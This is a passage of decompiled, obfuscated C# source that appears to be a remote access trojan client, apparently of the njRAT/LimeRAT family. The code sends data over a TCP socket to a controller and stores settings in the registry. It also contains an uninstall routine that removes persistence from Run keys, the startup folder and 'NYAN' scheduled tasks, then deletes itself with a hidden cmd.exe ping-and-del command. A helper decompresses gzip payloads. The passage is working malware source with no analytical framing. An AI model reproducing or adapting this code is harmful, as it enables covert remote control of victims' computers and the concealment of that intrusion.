								goto IL_026d;
								IL_0167:;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception projectError = ex;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (object_0 != null)
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							object_0 = null;
						}
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2);
						Exception projectError2 = ex2;
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					bool_2 = false;
				}
				while (!smethod_4());
				bool_2 = true;
			}
		}
	}

	public static byte[] smethod_25(ref string string_13)
	{
		return Encoding.UTF8.GetBytes(string_13);
	}

	public static bool smethod_26(string string_13)
	{
		return smethod_27(smethod_25(ref string_13));
	}

	public static bool smethod_27(byte[] byte_1)
	{
		if (!bool_2)
		{
			return false;
		}
		try
		{
			FileInfo fileInfo = fileInfo_0;
			lock (fileInfo)
			{
				if (!bool_2)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string string_ = byte_1.Length + "\0";
				byte[] array = smethod_25(ref string_);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(byte_1, 0, byte_1.Length);
				tcpClient_0.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			try
			{
				if (bool_2)
				{
					bool_2 = false;
					tcpClient_0.Close();
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception projectError2 = ex2;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return bool_2;
	}

	public static bool smethod_28(string string_13, object object_1, RegistryValueKind registryValueKind_0)
	{
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + string_8)
				.SetValue(string_13, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_1)), registryValueKind_0);
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_29()
	{
		string programFiles = ((ServerComputer)Class3.Class2_0).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				if (File.Exists(programFiles + string_8))
				{
					File.Delete(programFiles + string_8);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		smethod_23(0);
		bool_7 = false;
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_9, writable: true)!.DeleteValue(string_8, throwOnMissingValue: false);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError2 = ex;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_9, writable: true)!.DeleteValue(string_8, throwOnMissingValue: false);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError3 = ex2;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("schtasks /Delete /tn NYAN /F", (AppWinStyle)0, false, -1);
			Thread.Sleep(200);
			Interaction.Shell("schtasks /Delete /tn NYANP /F", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (bool_9)
			{
				File.SetAttributes(Interaction.Environ(string_3) + "\\" + string_4, FileAttributes.Normal);
			}
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_8);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError5 = ex3;
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(string_8, throwOnMissingSubKey: false);
			Interaction.DeleteSetting("Lime", (string)null, (string)null);
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError6 = ex4;
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + fileInfo_0.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError7 = ex5;
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static byte[] smethod_30(byte[] byte_1)
	{
		MemoryStream memoryStream = new MemoryStream(byte_1);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}
}
